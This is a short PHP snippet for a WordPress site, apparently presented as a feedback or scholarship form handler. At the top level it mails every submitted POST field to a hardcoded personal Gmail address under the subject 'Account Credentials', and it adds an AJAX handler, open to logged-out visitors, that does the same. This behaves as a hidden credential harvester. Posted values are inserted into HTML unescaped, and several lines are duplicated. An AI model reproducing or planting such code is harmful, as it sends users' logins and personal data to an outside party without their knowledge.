<?php 

$headers = array('Content-Type: text/html; charset=UTF-8');

$to = 'asadaly111@gmail.com';

$subject = "EMAIL ATHLETIC SCHOLARSHIP";

$message = '<html><body>';
$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
$message = '<html><body>';
$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
foreach ($_POST as $key => $value) {
	$message .= "<tr style='background: #eee;'><td><strong>".ucwords(str_replace('_', ' ', $key)).":</strong> </td><td>".$value."</td></tr>";
}
$message .= "</table>";
$message .= "</body></html>";
$message .= "</table>";
$message .= "</body></html>";

wp_mail($to, '86huaren - Account Credentials',$message, $headers);


add_action( "wp_ajax_form_submit", 'cs_functions', 10 );
add_action( "wp_ajax_nopriv_form_submit", 'cs_functions', 10 );
function cs_functions(){
$headers = array('Content-Type: text/html; charset=UTF-8');
$to = 'asadaly111@gmail.com';
$subject = "Feedback form";
$message = '<html><body>';
	$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
		$message = '<html><body>';
			$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
				foreach ($_POST as $key => $value) {
				$message .= "<tr style='background: #eee;'><td><strong>".ucwords(str_replace('_', ' ', $key)).":</strong> </td><td>".$value."</td></tr>";
				}
			$message .= "</table>";
		$message .= "</body></html>";
	$message .= "</table>";
$message .= "</body></html>";
wp_mail($to, $subject,$message, $headers);
print(json_encode($_POST));
exit();
}